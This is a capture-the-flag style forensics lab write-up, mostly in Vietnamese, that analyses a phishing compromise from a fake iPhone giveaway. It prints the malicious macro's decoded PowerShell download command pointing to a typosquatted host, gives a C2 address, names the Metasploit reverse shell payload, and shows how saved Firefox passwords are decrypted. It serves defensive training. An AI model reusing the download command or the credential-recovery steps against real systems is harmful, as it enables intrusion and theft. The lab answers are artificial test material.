author: Azaki
published: published
created: 2026-10-01
tags: CyberDefener, Lab, Threat Intel

A company’s employee joined a fake iPhone giveaway. Our team took a disk image of the employee's system for further analysis.  
As a soc analyst, you are tasked to identify how the system was compromised.

---
<p style="text-align:right; font-style:italic;">
  Author: <b>@Semah BenAli</b> 
</p>

## Q1: What is the hostname of the victim machine?

**Yêu cầu:** Xác định hostname của máy trạm nạn nhân

Trong quá trình điều tra một bản disk image Windows, hostname của hệ thống là một trong những thông tin định danh đầu tiên cần thu thập để đối chiếu với hệ thống giám sát và log mạng. Thông tin này được lưu trữ trong registry hive `SYSTEM`

Trích xuất hive `SYSTEM` và truy cập vào đường dẫn
```text
SYSTEM\ControlSet001\Control\ComputerName\ComputerName
```

Tại đây, giá trị `ComputerName` lưu trữ tên máy tính của nạn nhân
![Phishy Lab.png](./images/Phishy%20Lab.png)

>WIN-NF3JQEU4G0T

## Q2: What is the messaging app installed on the victim machine?

**Yêu cầu:** Xác định ứng dụng nhắn tin được cài đặt trên máy của nạn nhân

Kẻ tấn công thường nhắm vào các kênh liên lạc cá nhân hoặc mạng xã hội để phát tán các chiến dịch lừa đảo (Social Engineering). Kiểm tra thư mục người dùng của nạn nhân tại `root [AD1]\Users\Semah\Downloads`

Tại đây phát hiện bộ cài đặt của ứng dụng nhắn tin `WhatsApp.exe`
![Phishy Lab-1.png](./images/Phishy%20Lab-1.png)

>whatsapp

## Q3: The attacker tricked the victim into downloading a malicious document. Provide the full download URL

**Yêu cầu:** Xác định URL đầy đủ mà kẻ tấn công đã dùng để lừa nạn nhân tải về tài liệu độc hại

Sau khi xác định WhatsApp là ứng dụng nhắn tin được sử dụng, tiến hành kiểm tra cơ sở dữ liệu chat của WhatsApp Desktop. Lịch sử tin nhắn được lưu trữ trong tệp cơ sở dữ liệu SQLite

Mở bảng `messages` trong cơ sở dữ liệu bằng DB Browser for SQLite và kiểm tra nội dung trò chuyện. Tại dòng số 18, kẻ tấn công gửi tin nhắn thông báo danh sách trúng thưởng kèm liên kết tải về tài liệu Word
```text
We listed the 5 winners in this ... document "http://appIe.com/IPhone-Winners.doc"
```

Kẻ tấn công đã sử dụng kỹ thuật typosquatting tinh vi khi thay chữ `l` (thường) bằng chữ `I` (hoa) trong tên miền `appIe.com` nhằm đánh lừa người dùng
![Phishy Lab-2.png](./images/Phishy%20Lab-2.png)

>http://appIe.com/IPhone-Winners.doc

## Q4: Multiple streams contain macros in the document. Provide the number of the highest stream

**Yêu cầu:** Xác định số thứ tự của stream cao nhất chứa mã macro trong tài liệu Word

Phân tích tệp tài liệu `IPhone-Winners.doc` bằng công cụ `oledump.py`. Đây là công cụ chuyên dụng dùng để phân tích cú pháp các stream trong định dạng OLE (Compound File Binary Format) của Microsoft Office

Khi chạy lệnh `oledump IPhone-Winners.doc`, các stream chứa mã VBA macro sẽ được đánh dấu bằng chữ `M`
```text
9: M 1170 'Macros/VBA/eviliphone'
10: M 5581 'Macros/VBA/iphoneevil'
```

Như vậy, stream có số thứ tự cao nhất chứa macro là stream 10
![Phishy Lab-3.png](./images/Phishy%20Lab-3.png)

>10

## Q5: The macro executed a program. Provide the program name?

**Yêu cầu:** Xác định tên chương trình/tiến trình mà macro đã gọi thực thi

Sử dụng công cụ `olevba` để trích xuất và phân tích mã VBA trong tài liệu. Trong kết quả phân tích sơ bộ, `olevba` cảnh báo sự xuất hiện của hàm `Chr`, cho thấy mã độc đã cố tình làm rối (obfuscate) các chuỗi ký tự nhằm che giấu hành vi
![Phishy Lab-4.png](./images/Phishy%20Lab-4.png)

Tiếp tục chạy lại với tùy chọn `--deobf` để tự động giải mã các chuỗi ký tự ASCII được nối qua hàm `Chr()`. Kết quả giải mã cho thấy macro sử dụng `WScript.Shell` để khởi chạy chương trình `powershell` cùng tham số `-EncodedCommand`
![Phishy Lab-5.png](./images/Phishy%20Lab-5.png)

>PowerShell

## Q6: The macro downloaded a malicious file. Provide the full download URL

**Yêu cầu:** Xác định đường dẫn URL đầy đủ mà macro đã tải tệp độc hại về

Từ kết quả deobfuscate ở trên, thu được chuỗi Base64 truyền vào tham số `-EncodedCommand` của PowerShell
![Phishy Lab-6.png](./images/Phishy%20Lab-6.png)

Đưa chuỗi Base64 này vào CyberChef để giải mã. Do PowerShell mã hóa tham số `-EncodedCommand` theo bảng mã UTF-16LE nên sau khi decode Base64, loại bỏ các null byte để đọc lệnh bản rõ
```powershell
invoke-webrequest -Uri 'http://appIe.com/Iphone.exe' -OutFile 'C:\Temp\IPhone.exe' -UseDefaultCredentials
```

Từ câu lệnh trên, URL được sử dụng để tải tệp thực thi độc hại là `http://appIe.com/Iphone.exe`
![Phishy Lab-7.png](./images/Phishy%20Lab-7.png)

>http://appIe.com/Iphone.exe

## Q7: Where was the malicious file downloaded to? (Provide the full path)

**Yêu cầu:** Xác định đường dẫn đầy đủ nơi tệp độc hại được tải về và lưu trữ trên hệ thống

Quan sát tiếp câu lệnh PowerShell vừa được giải mã ở câu trước
```powershell
invoke-webrequest -Uri 'http://appIe.com/Iphone.exe' -OutFile 'C:\Temp\IPhone.exe' -UseDefaultCredentials
```

Tham số `-OutFile` chỉ định tệp thực thi sẽ được lưu trực tiếp vào thư mục tạm `C:\Temp\IPhone.exe`
![Phishy Lab-8.png](./images/Phishy%20Lab-8.png)

>C:\Temp\IPhone.exe

## Q8: What is the name of the framework used to create the malware?

**Yêu cầu:** Xác định tên framework được kẻ tấn công sử dụng để tạo ra mẫu mã độc này

Tính toán mã băm SHA-256 của tệp `IPhone.exe` (`72c677ba5bf40394361b3566b6bb2b1c0c5e726b10c9af2debf7384385ebdbd1`) và tra cứu trên VirusTotal

Trong phần **Crowdsourced YARA rules**, mẫu mã độc kích hoạt các quy tắc nhận diện
`Windows_Trojan_Metasploit_4a1c4da8` (Identifies Metasploit 64 bit reverse tcp shellcode) và `Windows_Trojan_Metasploit_0cc81460`. Điều này cho thấy tệp thực thi được tạo bằng framework Metasploit
![Phishy Lab-9.png](./images/Phishy%20Lab-9.png)

>Metasploit

## Q9: What is the attacker's IP address?

**Yêu cầu:** Xác định địa chỉ IP của kẻ tấn công (C2 Server)

Mẫu mã độc được tạo từ Metasploit với shellcode reverse TCP, nghĩa là khi thực thi nó sẽ chủ động kết nối ngược về máy chủ lắng nghe của kẻ tấn công

Kiểm tra phần **Behavior -> Contacted IP addresses** trên VirusTotal. Bỏ qua các địa chỉ IP của Microsoft và dịch vụ mạng thông thường, phát hiện địa chỉ IP ngoại tuyến bất thường mà mã độc kết nối tới là `155.94.69.27`
![Phishy Lab-10.png](./images/Phishy%20Lab-10.png)

>155.94.69.27

## Q10: The fake giveaway used a login page to collect user information. Provide the full URL of the login page?

**Yêu cầu:** Xác định URL đầy đủ của trang đăng nhập lừa đảo được sử dụng để thu thập thông tin người dùng

Kẻ tấn công tạo một trang web giả mạo để dụ người dùng đăng nhập tài khoản trước khi nhận quà giveaway. Để tìm URL này, tiến hành kiểm tra lịch sử duyệt web của nạn nhân

Trình duyệt được sử dụng là Firefox. Cơ sở dữ liệu lịch sử được lưu tại `places.sqlite` trong thư mục profile của người dùng
```text
root\Users\Semah\AppData\Roaming\Mozilla\Firefox\Profiles\pyb51x2n.default-release\places.sqlite
```
![Phishy Lab-11.png](./images/Phishy%20Lab-11.png)

Mở tệp `places.sqlite` bằng DB Browser for SQLite và kiểm tra bảng `moz_places`. Lọc theo các URL được truy cập, tìm thấy bản ghi có URL
```text
http://appIe.competitions.com/login.php
```
![Phishy Lab-12.png](./images/Phishy%20Lab-12.png)

>http://appIe.competitions.com/login.php

## Q11: What is the password the user submitted to the login page?

**Yêu cầu:** Xác định mật khẩu mà người dùng đã nhập trên trang đăng nhập giả mạo

Trình duyệt Firefox lưu trữ thông tin đăng nhập và mật khẩu đã lưu trong tệp `logins.json` và được mã hóa bằng khóa nằm trong `key4.db`
![Phishy Lab-13.png](./images/Phishy%20Lab-13.png)

Để khôi phục mật khẩu, trích xuất hai tệp này và sử dụng công cụ **PasswordFox** (hoặc công cụ trích xuất credential của Firefox)

Công cụ tự động giải mã và hiển thị thông tin đăng nhập cho website `https://appIe.com` với người dùng `Semah`. Mật khẩu được ghi nhận là `GacsriicUZMY4xiAF4yl`
![Phishy Lab-14.png](./images/Phishy%20Lab-14.png)

>GacsriicUZMY4xiAF4yl